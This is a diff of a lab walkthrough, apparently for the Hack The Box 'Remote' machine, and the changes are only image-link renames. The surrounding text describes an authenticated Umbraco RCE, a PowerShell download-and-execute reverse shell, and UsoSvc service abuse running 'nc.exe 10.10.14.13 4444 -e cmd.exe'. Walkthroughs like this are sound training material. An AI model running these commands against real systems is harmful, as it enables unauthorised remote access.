@@ -113,15 +113,15 @@ So now we have some credentials at least.
 
 There were hints that Umbraco was used to host the sites, so let's view port 80. It seems to be a blog page:
 
-![](<../../../.gitbook/assets/image%20(2221).png>)
+![](../../../.gitbook/assets/remote-1.png)
 
 The login page for the website is located at the `/Umbraco` directory. We can login with the credentials and email we found earlier.
 
-![](<../../../.gitbook/assets/image%20(380).png>)
+![](../../../.gitbook/assets/remote-3.png)
 
 After logging in, we can enumerate the version that it is running.
 
-![](<../../../.gitbook/assets/image%20(3873).png>)
+![](../../../.gitbook/assets/remote-4.png)
 
 This version of Umbraco is vulnerable to an Authenticated RCE exploit:
 
@@ -155,7 +155,7 @@ host = "http://10.129.227.150";
 
 Take note of the `cmd` and `FileName` parameter in the `payload` variable. In my case I just used Powershell to download and execute a reverse shell script.
 
-![](<../../../.gitbook/assets/image%20(2517).png>)
+![](../../../.gitbook/assets/remote-2.png)
 
 ## Privilege Escalation
 
@@ -214,6 +214,6 @@ We have control over the `UsoSvc` service. With this, we can run commands as the
 <strong>Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command 'C:\Windows\Tasks\nc.exe 10.10.14.13 4444 -e cmd.exe'
 </strong></code></pre>
 
-![](<../../../.gitbook/assets/image%20(879).png>)
+![](../../../.gitbook/assets/remote-5.png)
 
 Rooted!
